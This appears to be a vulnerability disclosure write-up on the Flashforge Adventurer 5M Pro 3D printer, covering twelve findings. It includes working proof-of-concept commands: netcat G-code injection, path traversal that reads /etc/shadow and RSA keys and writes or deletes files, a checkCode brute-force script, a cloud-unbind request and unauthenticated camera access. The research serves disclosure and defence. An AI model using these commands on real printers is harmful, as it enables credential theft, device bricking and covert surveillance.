# Flashforge Adventurer 5M Pro — Security Vulnerabilities

**Researcher:** NSM Barii  
**Date:** 2026-11-20  
**Affected Product:** Flashforge Adventurer 5M Pro  
**Affected Firmware:** Stock firmware (tested on current production release)  
**Vendor:** Zhejiang Flashforge 3D Technology Co., Ltd.

---

## Finding 1 — Unauthenticated G-code Execution (CWE-306)

**Severity:** CVSS 8.8 (High)  
**Vector:** `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

TCP port 8899 accepts G-code commands from any host on the network with no authentication. An attacker can:

- Query device info, temperatures, endstop states, print status (M115, M105, M119, M114, M661)
- Actuate fans, heaters, stepper motors, LEDs (M106, M104, M140, G28, G1, M146)
- Cancel active print jobs (M26)

No credentials, tokens, or pairing required.

**Additional impact — Denial of Service:** Spamming M26 (cancel print) will repeatedly cancel any active print job. The user cannot complete a print while an attacker is on the network.

**Proof of Concept:**
```
$ echo "~M115" | nc <printer_ip> 8899
```
Returns full device identity including firmware version, serial number, and machine type.

---

## Finding 2 — Path Traversal via M23/M28/M30 — Read, Write, Delete (CWE-22)

**Severity:** CVSS 9.6 (Critical)  
**Vector:** `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

Multiple G-code commands accept path traversal sequences, enabling an unauthenticated attacker to **read, write, and delete** arbitrary files on the filesystem:

| Command | Function | Traversal Confirmed |
|---------|----------|-------------------|
| M23 | Select/read file — confirms existence + exact byte size | Yes |
| M28 | Create/write file at arbitrary path | Yes |
| M30 | Delete file at arbitrary path | Yes |

48 files confirmed readable including `/etc/shadow`, `/opt/key.priv`, `/opt/config/printer.cfg`, and `/var/log/messages`.

**Proof of Concept — Read:**
```
$ echo "~M23 /data/../../etc/shadow" | nc <printer_ip> 8899
→ File opened: ../../etc/shadow Size: 273
```

**Proof of Concept — Write (arbitrary path):**
```
$ echo "~M28 /data/../../tmp/pwned.txt" | nc <printer_ip> 8899
→ CMD M28 Received.
$ echo "~M29" | nc <printer_ip> 8899
→ Done saving file.
$ echo "~M23 /data/../../tmp/pwned.txt" | nc <printer_ip> 8899
→ File opened: ../../tmp/pwned.txt Size: 0
```

**Proof of Concept — Delete (arbitrary path):**
```
$ echo "~M30 /data/../../tmp/pwned.txt" | nc <printer_ip> 8899
→ ok
```

**Selected confirmed readable paths:**

| Path | Size | Sensitivity |
|------|------|-------------|
| `/etc/shadow` | 273 B | Root password hash |
| `/etc/wpa_supplicant.conf` | 59 B | WiFi credentials |
| `/opt/key.priv` | 1,675 B | RSA private key |
| `/opt/private.pem` | 1,743 B | RSA key pair |
| `/opt/config/printer.cfg` | 1,768 B | Klipper configuration |
| `/etc/hostapd.conf` | 188 B | AP configuration |

Full list of 48 confirmed paths available in the PoC tool.

**Impact:** An unauthenticated attacker can delete critical system files (`/etc/shadow`, `/etc/hosts`, config files), bricking the device or causing service failures. M28 creates files at arbitrary paths but writes 0-byte content, so it cannot plant payloads — however, overwriting a script like `flashforge_init.sh` or `auto_run.sh` with a 0-byte file would destroy it, breaking the firmware update chain (Finding 7).

**Additional impact — Denial of Service:** Rapid M23 requests with invalid paths trigger a "File not found" error dialog on the printer's LCD, freezing the UI for several seconds per request. Sustained flooding renders the printer completely unusable — the touchscreen becomes unresponsive and the user cannot interact with the device until the attack stops.

---

## Finding 3 — UDP Amplification Reflector (CWE-406)

**Severity:** CVSS 7.5 (High)  
**Vector:** `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:H`

UDP port 19000 responds to any non-empty packet with a 280-byte identity dump. No authentication. No rate limiting. Supports multicast (225.0.0.9:19000).

- **Amplification factor:** 280x (1 byte in → 280 bytes out)
- **Tested at 400+ packets/sec** with no dropped responses
- Response leaks: machine name, serial number, vendor/product IDs, TCP/HTTP ports, cloud bind status

**Proof of Concept:**
```
$ echo -n "x" | nc -u <printer_ip> 19000
```
Returns 280-byte binary response containing full device identity.

---

## Finding 4 — Hardcoded Root Password (CWE-798)

**Severity:** CVSS 7.5 (High)  
**Vector:** `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

The firmware ships a static `/etc/shadow` file that is copied to the device on every firmware update. The root password hash is identical across all Adventurer 5M Pro devices worldwide.

**Source:** `flashforge_init.sh`, line 42:
```bash
cp $WORK_DIR/shadow /etc/shadow
```

**Evidence:** The shadow file contains an MD5crypt hash for root (`$1$XXXXXXXX$XXXXXXXXXXXXXXXXXXXXXX`). The hash is redeployed on every firmware update, overwriting any user changes.

---

## Finding 5 — Hardcoded WiFi AP Password (CWE-798)

**Severity:** CVSS 6.0 (Medium)  
**Vector:** `CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N`

Firmware analysis indicates the printer is capable of creating a WiFi access point with a hardcoded password. The SSID and password are compiled into the main firmware binary (`firmwareExe`), `hostapd` is bundled in the firmware for AP management, and the AP configuration file `/etc/hostapd.conf` (188 bytes) is present on the device. The AP has not been observed active during normal operation — it may only activate during initial setup, factory reset, or cloud pairing flows.

**Source:** Hardcoded strings in `firmwareExe` binary:
```
"Adventurer5M Pro"    (SSID)
"XXXXXXXX"            (passphrase)
```

Also referenced as dead variables in `flashforge_init.sh` lines 40-41, suggesting the AP configuration was moved from shell to the compiled binary.

**Impact:** If the AP activates (during setup, factory reset, or pairing), any device within WiFi range can join using the known default password. The password is identical across all units.

---

## Finding 6 — Hardcoded RSA Key Passphrase (CWE-798)

**Severity:** CVSS 6.5 (Medium)  
**Vector:** `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

The RSA key pair used for device authentication is generated with a 4-character hardcoded passphrase.

**Source:** `flashforge_init.sh`, lines 47-67:
```bash
password=XXXX
openssl genrsa -des3 -passout pass:${password} -out ${key_pair} 2048
```

The private key is stored at `/opt/key.priv` (1,675 bytes) and is confirmed readable via the M23 path traversal (Finding 2). Combined with the known passphrase, the private key is fully recoverable.

---

## Finding 7 — Unsigned Firmware Updates (CWE-347)

**Severity:** CVSS 6.8 (Medium)  
**Vector:** `CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

The device accepts firmware updates via USB with no signature verification. `auto_run.sh` mounts any inserted USB drive, looks for `Adventurer5MPro-*.tgz`, extracts it, and runs the contents as root.

**Source:** `auto_run.sh`, lines 42-63:
```bash
ls -1t /mnt/Adventurer5MPro-*.tgz
# ...
tar -xvf ${SRCFILE} -C /data/update/
# ...
/data/update/flashforge_init.sh ${MACHINE} ${PID}
```

No `gpg`, `openssl verify`, hash comparison against a known-good value, or any other integrity check appears anywhere in the update chain.

**Impact:** Physical USB access → arbitrary code execution as root.

---

## Finding 8 — LAN Mode Access Control Inconsistency (CWE-284)

**Severity:** CVSS 7.4 (High)  
**Vector:** `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

The printer has two network services: TCP port 8899 (G-code) and HTTP port 8898 (file upload/camera/API). The LAN mode setting is only enforced on port 8898 — the HTTP endpoints return `{"code":-2,"message":"Lan mode error"}` when LAN mode is off.

Port 8899 accepts unauthenticated G-code commands **regardless of LAN mode setting**. This means the more dangerous interface (raw command execution, path traversal, physical actuation) has zero access control in any mode.

**Proof of Concept:**

With LAN mode OFF (cloud mode, `connect_mode: 1`):
```
# Port 8899 — works, no auth
$ echo "~M115" | nc <printer_ip> 8899
→ Returns full device identity

# Port 8898 — blocked
$ curl -X POST http://<printer_ip>:8898/detail \
  -H 'Content-Type: application/json' \
  -d '{"serialNumber":"<serial>","checkCode":"<code>"}'
→ {"code":-2,"message":"Lan mode error"}
```

**Responsive endpoints on port 8898:**
- `POST /detail` — full device state dump
- `POST /printGcode` — remote print execution
- `POST /uploadGcode` — file upload to printer

All enforce LAN mode. Port 8899 does not.

---

## Finding 9 — `/notifyWanBind` Bypasses LAN Mode and CheckCode Authentication (CWE-284)

**Severity:** CVSS 7.4 (High)  
**Vector:** `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`

The `/notifyWanBind` endpoint on port 8898 bypasses **both** the LAN mode access control and the checkCode authentication. While all other HTTP API endpoints return `"Lan mode error"` in cloud mode, `/notifyWanBind` accepts requests and succeeds with only the device serial number.

**Authentication bypass confirmed:**

| Request | Response |
|---------|----------|
| Serial + correct checkCode | `{"code":0,"message":"Success"}` |
| Serial + wrong checkCode | `{"code":0,"message":"Success"}` |
| Serial + no checkCode | `{"code":0,"message":"Success"}` |
| Wrong serial | `{"code":-1,"message":"SN is different"}` |
| No serial | `{"code":-1,"message":"SN is different"}` |

The endpoint accepts a `bind` parameter (true/false). Both values return success, indicating it controls the printer's cloud binding state.

**Proof of Concept:**
```
# Obtain serial from UDP 19000 (Finding 3)
$ echo -n "x" | nc -u <printer_ip> 19000
→ serial number at offset 0x92

# Unbind printer from cloud — no checkCode needed, works in cloud mode
$ curl -X POST http://<printer_ip>:8898/notifyWanBind \
  -H 'Content-Type: application/json' \
  -d '{"serialNumber":"<serial>","bind":false}'
→ {"code":0,"message":"Success"}
```

**Impact:** An attacker on the LAN can disrupt the printer's cloud connectivity using only the serial number, which is freely broadcast on UDP 19000. No physical access, no checkCode, and no LAN mode restriction.

**Endpoint coverage:** A brute-force scan of 146 endpoints confirmed that `/notifyWanBind` is the only endpoint that bypasses both LAN mode and checkCode validation. `GET /getThum` also responds in cloud mode (39 bytes) but carries no authentication impact.

---

## Finding 10 — Unauthenticated Camera Stream (CWE-306)

**Severity:** CVSS 7.1 (High)  
**Vector:** `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`

Port 8080 exposes a live MJPEG camera feed via `mjpg-streamer` with no authentication. The stream is accessible to any host on the network regardless of LAN mode setting and persists across reboots.

- **URL:** `http://<printer_ip>:8080/?action=stream`
- **Resolution:** 640x480
- **Auth required:** None
- **LAN mode enforced:** No — streams in both LAN and cloud mode
- **Service:** mjpg-streamer (identified by `boundary=boundarydonotcross`)

The camera URL is also leaked in the `/detail` API response (`cameraStreamUrl` field), but no knowledge of the API is needed — the stream is directly accessible on port 8080.

**Proof of Concept:**
```python
import requests
r = requests.get("http://<printer_ip>:8080/?action=stream", stream=True, timeout=5)
# r.status_code == 200 — live MJPEG video, no login
# Or open in any browser: http://<printer_ip>:8080/?action=stream
```

**Impact:** Any device on the network can view the printer's live camera feed. These printers are deployed in homes, offices, and workshops — an unauthenticated camera is a direct privacy violation.

---

## Finding 11 — Camera Stream Sent to Chinese Cloud Infrastructure (CWE-319)

**Severity:** CVSS 6.5 (Medium)  
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

The firmware contains hardcoded RTMP streaming infrastructure that routes the camera feed through Flashforge-controlled servers in China. The RTMP endpoints are compiled into the binary:

| Endpoint | Purpose |
|----------|---------|
| `rtmp://livepush.flashforge.com/` | Printer pushes live video here |
| `rtmp://liveplay.flashforge.com/` | App pulls live video from here |
| `rtmp://115.231.29.49:2045/Adventurer5M/<serial>` | Hardcoded fallback — Hangzhou, China |

The RTMP stream key is the device serial number (e.g. `/Adventurer5M/<serial>`), which is freely broadcast on UDP 19000 (Finding 3).

**Infrastructure details:**
- `115.231.29.49` — registered to **Hangzhou Sulian Mdt InfoTech Ltd**, Hangzhou, China (WHOIS confirmed)
- `livepush.flashforge.com` — resolves to `155.102.54.165/166`, RTMP port 1935 open
- `liveplay.flashforge.com` — resolves to `155.102.54.171-174`, RTMP port 1935 open
- Full **Alibaba Cloud OSS SDK** compiled into the firmware — file/thumbnail/video upload capability to Chinese cloud storage

**Additional evidence from firmware binary:**
- `setStreamUrl` / `pushUrl` functions — configure RTMP push destination
- `opencamera` / `closecamera` — MQTT cloud commands that trigger RTMP streaming
- Alibaba Cloud OSS operations: `PutObjectResult`, `ListObjectsResult`, `GetBucketInfoResult`

**Impact:** The RTMP streaming infrastructure is hardcoded into the firmware regardless of whether the user has a Flashforge cloud account. The camera feed is accessible locally on port 8080 with no authentication (Finding 10), and the firmware contains the code and endpoints to push that feed to Chinese servers. The RTMP stream is keyed by the serial number, which is broadcast unauthenticated on the LAN. Users in environments with data sovereignty requirements (government, defense, corporate) may be unknowingly running a device with built-in capability to route video surveillance data to foreign infrastructure — no cloud account or opt-in required.

---

## Finding 12 — HTTP API with Serial-Based Access Control (CWE-287)

**Severity:** CVSS 7.4 (High)  
**Vector:** `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

Port 8898 exposes an OrcaSlicer-compatible HTTP API (`OrcaServer`) with confirmed endpoints:

| Endpoint | Method | Function |
|----------|--------|----------|
| `/getThum` | GET | Retrieve print thumbnails |
| `/printGcode` | POST | Trigger remote print execution |
| `/uploadGcode` | POST | Upload G-code files to printer |
| `/detail` | POST | Full device state dump |
| `/product` | POST | Product capability flags |
| `/control` | POST | Send commands (light, temp, fan, job) |
| `/gcodeList` | POST | List stored G-code files |
| `/checkCode` | POST | Validate access credentials |
| `/notifyWanBind` | POST | Cloud bind control (see Finding 9) |

In LAN mode, the access control is a serial number + checkCode comparison. The device serial is freely broadcast via UDP port 19000 (see Finding 3). The checkCode is an 8-character hex string displayed on the printer's LCD, rotatable by the user.

**No rate limiting, no lockout:** 500 consecutive wrong checkCode attempts were sent at 110+ requests/sec with zero throttling, zero delay increase, and zero account lockout. The correct checkCode was accepted immediately after all 500 failures.

**Proof of Concept — No brute force protection:**
```python
import requests
url = 'http://<printer_ip>:8898/checkCode'
for i in range(500):
    code = f'{i:08x}'
    r = requests.post(url, json={"serialNumber":"<serial>","checkCode":code})
    # Every response: {"code":1,"message":"Access code is different"}
    # No slowdown, no lockout after any number of attempts

# Correct code STILL works after 500 wrong attempts:
r = requests.post(url, json={"serialNumber":"<serial>","checkCode":"<correct>"})
# → {"code":0,"message":"Success"}
```

**Proof of Concept — Serial-only access:**
```
$ curl -X POST http://<printer_ip>:8898/uploadGcode \
  -F "file=@payload.gcode" \
  → {"code":1,"message":"SN is different"}

# Note: "SN is different" (not "unauthorized") — the only
# barrier is knowing the serial, which Finding 3 provides freely
```

The `/detail` endpoint returns full device state (firmware version, MAC address, temperatures, disk space, print status, camera URL, air quality sensor, door status) when provided the correct `serialNumber` + `checkCode`.

**Impact:** Remote file upload, print execution, and full device state access. The authentication model relies on:
- Something broadcast on the network (serial)
- Something displayed on a screen (8-char hex code, rotatable by the user)
- Zero brute force protection — the checkCode can be guessed indefinitely with no penalty

---

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-11-19 | Initial discovery of unauthenticated G-code execution |
| 2026-11-20 | Path traversal, UDP amplification, firmware analysis completed |
| TBD | Vendor notification |
| TBD | Public disclosure |

## Tools

PoC tools available in the `src/` directory of this repository.
